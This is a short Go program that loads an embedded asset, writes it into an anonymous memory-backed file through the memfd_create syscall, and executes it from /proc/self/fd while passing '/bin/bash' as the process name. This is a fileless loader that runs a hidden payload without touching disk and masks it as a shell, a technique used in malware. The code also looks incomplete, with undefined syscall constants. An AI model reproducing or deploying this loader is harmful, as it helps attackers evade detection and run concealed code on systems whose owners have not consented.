package main

import (
	"syscall"
	"unsafe"
	"fmt"
	
)
func main() {
	
	data, err := Asset("test")
	if err != nil {
		// Asset was not found.
		fmt.Println("read test file content error!")
	}
	filename := ""

	fd, _, _ := syscall.Syscall(memfdCreate, uintptr(unsafe.Pointer(&filename)), uintptr(mfdCloexec), 0)

	_, _ = syscall.Write(int(fd), data)
	displayName := "/bin/bash"

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)
	_ = syscall.Exec(fdPath, []string{displayName}, nil)

}